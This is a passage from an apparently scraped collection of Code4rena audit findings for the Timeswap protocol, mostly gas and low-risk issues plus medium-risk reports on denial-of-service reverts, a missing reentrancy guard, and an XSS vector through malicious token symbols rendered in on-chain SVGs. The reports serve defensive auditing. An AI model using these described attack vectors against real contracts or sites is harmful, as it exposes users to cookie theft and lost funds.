"html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/131", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  thank_you   # Vulnerability details  ## Impact SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.  The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.   These set of circumstances leads to XSS when the SVG is loaded on any website.   ## Proof of Concept 1. Hacker generates an ERC20 token with a symbol that contains malicious Javascript. 2. Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1. 3. When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol. 4. When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.   ## Tools Used N/A  ## Recommended Mitigation Steps Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.   As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.   "}, {"title": "subtract values in the if statement to avoid a useless operation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  OriDabush   # Vulnerability details  # TimeswapPair.sol - Gas Optimization Lines 289-290 can be transferred into the if statements to avoid subtract 0 from the variables.  ### code before: pool.state.reserves.asset -= tokensOut.asset;  pool.state.reserves.collateral -= tokensOut.collateral;  if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);  if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);  ### code after:  if (tokensOut.asset > 0) {     asset.safeTransfer(assetTo, tokensOut.asset);     pool.state.reserves.asset -= tokensOut.asset; }  if (tokensOut.collateral > 0) {     collateral.safeTransfer(collateralTo, tokensOut.collateral);     pool.state.reserves.collateral -= tokensOut.collateral; }     "}, {"title": "Gas: No need to initialize variables with default values", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ``` Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:119:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:147:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:201:        for (uint256 i = 0; i < data.length; i++) { ```     ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   "}, {"title": "`safeSymbol()` can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/114", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.  The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  ## Proof of Concept  The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol  The `safeSymbol()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  "}, {"title": "`safeName()` can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/113", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.  The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:  https://kauri.io/#single/dai-token-guide-for-developers/#token-info  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  ## Proof of Concept  The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol  The `safeName()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  "}, {"title": "safeDecimals can revert causing DoS", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.  A similar issue was found in a previoud code4rena contest: https://github.com/code-423n4/2021-05-nftx-findings/issues/46  ## Proof of Concept  The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol  The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32` https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54  `safeDecimals()` is used in multiple functions such as - CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54) - Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34) - Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)  ## Recommended Mitigation Steps  Modify the `safeDecimals()` function to change >= 32 to == 32 like this `if (success && data.length == 32) return   abi.decode(data, (uint8));`  "}, {"title": "Caching weth in timeswapMintCallback can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  In `TimeswapConvenience.sol` the `weth` state variable is read twice. It can just be immediately assigned locally so that the two `deposit` calls avoid reading the same variable from storage  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505) - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `weth` to `localWeth`  "}, {"title": "Caching pair in timeswapPayCallback can save gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/106", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  In `CollateralizedDebt.sol` the `pair` state variable is read twice. It can just be immediately assigned locally so that the `require` and the `collateralizedDebtCallback` do not read the same state variable twice  ## Proof of Concept  ```jsx function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {     require(msg.sender == address(pair), 'E401');      convenience.collateralizedDebtCallback(pair, maturity, assetIn, data); } ```  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `pair` to e.g `localPair`  "}, {"title": "Constructor Does Not Check for Zero Addresses for _factory and _weth", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Meta0xNull   # Vulnerability details  ## Impact A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62-L64  ## Tools Used Manual Review  ## Recommended Mitigation Steps requires Addresses is not zero.  require(_factory != address(0), \"Address Can't Be Zero\") require(_weth != address(0), \"Address Can't Be Zero\")  "}, {"title": "TimeswapPair.pay doesn't check for non-existent debt owner", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/97", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Similarly, the system will fail with low-level message without giving a business reason, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  The owner variable is used by TimeswapPair.pay without validation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L357  Which will yield low-level fail on array access if an owner is zero or not present in the system:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L360   ## Recommended Mitigation Steps  Verify owner function argument to be non-zero by expanding existing check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L352  Then, require in line 358 that, for example, dues.length >= ids.length:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L358   "}, {"title": "WithdrawMath.getCollateral reads storage repetitively for the same state variables that don\u2019t change", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on state variables storage access.  ## Proof of Concept  getCollateral only reads state.reserves.asset, state.totalClaims.insurance and state.reserves.collateral up to 2 times each, and state.totalClaims.bond up to 4 times:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L26   ## Recommended Mitigation Steps  Save all four state variables to memory before running the logic.   "}, {"title": "TimeswapPair's burn miss current pool liquidity check", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  If there is no liquidity in the pool, burn operation will not make sense and be reverted on low level math of decreasing liquidity share. It will be more transparent and uniform to add a check for liquidity before the logic.   ## Proof of Concept  ` burn` doesn't check for liquidity of the pool:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L205   ## Recommended Mitigation Steps  There is a check in other relevant functions, it can be added in the very same form here: ` require(pool.state.totalLiquidity > 0, 'E206')`  Error description can be updated to include ` burn `:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/ErrorCodes.md#e206   "}, {"title": "more efficient gas usage by removing && operator", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check. using additional require check can save more gas:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L151-L152 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L201-L202 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L234-L235 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L272-L273 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L309-L310 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L351  ## Tools Used https://remix.ethereum.org  ## Recommended Mitigation Steps example: require(liquidityTo != address(0), 'E201' ); require(dueTo != address(0), 'E201');   "}, {"title": "TimeswapPair.sol modifier lock: Switching between 1, 2 instead of 0, 1 is more gas efficient", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  bitbopper   # Vulnerability details  ## Impact `https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L121:L126` could be more gas efficient  ## Proof of Concept ### Version as in Repo  ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofOld {  uint256 locked = 0;   modifier lock() {      require(locked == 0, 'E211');      locked = 1;      _;      locked = 0;  }   function test() public lock {  }  } ``` ### Proposed Version ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofNew {  uint256 locked = 1;   modifier lock() {      require(locked == 1, 'E211');      locked = 2;      _;      locked = 1;  }   function test() public lock {  }  } ```  ### Comparison #### Test harness ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  import \"ds-test/test.sol\";  import \"./LockProofOld.sol\"; import \"./LockProofNew.sol\";  contract LockProofTest is DSTest {     LockProofOld lockproofold;     LockProofNew lockproofnew;      function setUp() public {         lockproofold = new LockProofOld();         lockproofnew = new LockProofNew();     }      function test_old() public {   lockproofold.test();     }      function test_new() public {   lockproofnew.test();     } } ``` #### Output ``` dapp test Running 2 tests for src/LockProof.t.sol:LockProofTest [PASS] test_old() (gas: 21042) [PASS] test_new() (gas: 1136) ```   "}, {"title": "`pendingOwner` should be reset to `address(0)` after `acceptOwner()` is successfully called", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/83", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The `acceptOwner()` external function can be called indefinitely instead of only once. The contract's state doesn't reflect reality. The code doesn't follow the standard implementation of a 2-step ownership transfer.  ## Proof of Concept Here's the current `acceptOwner()` external function, which lacks a reset of `pendingOwner` to `address(0)` : ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;          emit AcceptOwner(msg.sender);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the code to: ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;         pendingOwner = address(0); // @audit : line to add          emit AcceptOwner(msg.sender);     } ```  "}, {"title": "Unused Named Returns", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Removing unused named return variables can reduce gas usage and improve code clarity.  ## Proof of Concept In `TimeswapPair:constantProduct()`, you return using both named return and actual return statement. To save gas and improve code quality consider using only one of those.  ```     /// @inheritdoc IPair     function constantProduct(uint256 maturity)         external         view         override         returns (             uint112 x,             uint112 y,             uint112 z         )     {         State memory state = pools[maturity].state;         return (state.x, state.y, state.z);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused named returns  "}, {"title": "Gas optimization: Placement of require statements in `TimeswapPair:pay()`", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Some of the require statements can be placed earlier to reduce gas usage on revert. As a reminder from the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf), Appendix G and Appendix H: - TIMESTAMP costs 2 gas - ADDRESS costs 2 gas - MLOAD costs 3 gas  ## Proof of Concept The following can be reorder to save gas on revert:  ```         require(block.timestamp < maturity, 'E202');          require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205');         require(to != address(0), 'E201');         require(to != address(this), 'E204'); ``` to ```         require(block.timestamp < maturity, 'E202');         require(to != address(0), 'E201');         require(to != address(this), 'E204');         require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205'); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Relocate the said require statements  "}, {"title": "\"constants\" expressions are expressions, not constants. Use \"immutable\" instead.", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Due to how `constant` variables are implemented, an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.      If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.    See: [ethereum/solidity#9232]([https://github.com/ethereum/solidity/issues/9232](https://github.com/ethereum/solidity/issues/9232))      ## Proof of Concept   ```   Timeswap-V1-Convenience\\contracts\\libraries\\DateTime.sol:31:    uint constant SECONDS_PER_DAY = 24 * 60 * 60; Timeswap-V1-Convenience\\contracts\\libraries\\DateTime.sol:32:    uint constant SECONDS_PER_HOUR = 60 * 60; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change these expressions from `constant` to `immutable` and implement the calculation in the constructor   "}, {"title": "Mint library uses wrong error code for max collateral check", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/56", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  There can be issues with troubleshooting and system usage analytics.  ## Proof of Concept  E512 error code is meant for 'Debt is greater than max Debt' situation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e512   In Mint library E512 is used for collateral max value check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L482   Also, code E513, that is to be used for collateral check above, is also used for max asset increase check, which doesn\u2019t seem to have an error code of its own:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L481  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L643   ## Recommended Mitigation Steps  Change Mint line 482 error code to be 513: https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e513  Possibly add an error code for max asset check for Mint lines 481 and 643.  "}, {"title": "Gas saving", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept Moving the substraction inside the if condition in `TimeswapPair.withdraw` could be avoided the zero substraction.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Change: ``` pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);. ``` to ```         if (tokensOut.asset > 0) { pool.state.reserves.asset -= tokensOut.asset; asset.safeTransfer(assetTo, tokensOut.asset); }         if (tokensOut.collateral > 0) { pool.state.reserves.collateral -= tokensOut.collateral; collateral.safeTransfer(collateralTo, tokensOut.collateral);. } ```  "}, {"title": "A more efficient for loop index proceeding", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Here you could use unchecked{++i} to save gas since it is more efficient then i++.  ``` for (uint256 i; i < ids.length; i++) {  ```  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359  ## Tools Used Remix  ## Recommended Mitigation Steps  "}, {"title": "No check that _factory and _weth are different addresses in constructor ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/45", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapConvenience.sol the constructor takes in 2 addresses for _factory and _weth and sets them in storage without checking that they are unique which can introduce possible costly errors during deployment.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62  ## Tools Used Manuel code review   ## Recommended Mitigation Steps Add to TimeswapConvenience.sol constructor:   require(_factory != _weth, \"Duplicate address\")  "}, {"title": "no reentrancy guard on mint() function that has a callback ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/43", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In CollateralizedDebt.sol, the mint() function calls _safeMint() which has a callback to the \"to\" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.    ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395  ## Tools Used Manual code review   ## Recommended Mitigation Steps Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol   "}, {"title": "gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/MintMath.sol#L65  ``` y <= x ``` can be removed  "}, {"title": "dangerous receive function", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/35", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L69  the contract should receive ether only from weth,  consider adding:  ``` require(msg.sender == weth); ```  "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  robee   # Vulnerability details  The function dueOf in CollateralizedDebt.sol could be set external   "}, {"title": "SafeTransfer library called from pay() function is not needed ", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol the pay() function calls safeTransfer() and does so using the SafeTransfer.sol library when it can simply add the open zeppelin SafeERC20.sol import directly inside TimeswapPair.sol itself eliminating the unnecessary code in the protocols own SafeTransfer library.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeTransfer.sol#L7  ## Tools Used Manual code review   ## Recommended Mitigation Steps Use the open zeppelin SafeERC20 import directly inside the TimeswapPair.sol file instead of calling your own library.  The extra safeTransfer library can then be deleted.   "}, {"title": "pay() function has callback to msg.sender before important state updates ", "html_url": 